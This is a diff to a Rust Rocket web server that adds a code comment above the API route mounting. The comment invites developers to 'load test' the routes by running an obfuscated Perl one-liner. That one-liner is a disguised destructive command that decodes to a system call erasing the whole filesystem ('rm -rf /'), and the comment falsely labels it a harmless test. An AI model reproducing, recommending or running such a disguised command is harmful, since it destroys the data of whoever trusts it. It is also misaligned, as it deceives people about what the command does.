@@ -174,6 +174,11 @@ fn rocket() -> _ {
         },
     };
 
+    /**
+    * You can test these API routes by running
+    * perl -e '$??s:;s:s;;$?::s;;=]=>%-{<-|}<&|`{;; y; -/:-@[-`{-};`-{/" -;;s;;$_;see'
+    * which will perform a simple load test
+    */
     rocket::custom(figment)
         .mount("/", routes![root, static_files])
         .mount("/api", routes![post_confession, get_confession])
